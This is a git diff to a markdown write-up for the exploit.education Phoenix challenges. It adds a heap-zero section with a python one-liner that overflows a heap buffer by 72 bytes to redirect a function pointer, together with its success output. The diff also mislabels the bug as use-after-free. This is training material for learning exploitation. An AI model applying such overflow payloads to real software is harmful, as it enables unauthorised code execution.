@@ -251,7 +251,8 @@ To run the code:
 
 - The steps involved includes:
   1- Getting the location of int changeme which is global variable:
-	  ```
+
+	```
 	  user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-three | grep changeme
 	  08049844 B changeme
 	  
@@ -379,3 +380,24 @@ from pwn import *
 
 ```
 
+
+---
+
+# Heap Exploitation :
+---
+
+## Heap-Zero
+
+	- The heap-zero challenge requires the understanding of UAF heap vulnerability in which the freed malloc object is 
+	used again.
+	- Freed malloc object can be used to redirect to call the intended function which we want to call.
+	- In this particular challenge we have to overflow the heap upto 72 bytes on the 32 bit machine in order to 
+	reach out to the desired location and then add the address of the function which want to call.
+	
+	```
+	user@phoenix-amd64:~$ /opt/phoenix/i486/heap-zero $(python -c "print 'A'*72 + '\x35\x88\x04\x08'") 
+	Welcome to phoenix/heap-zero, brought to you by https://exploit.education
+	data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
+	Congratulations, you have passed this level
+
+	```
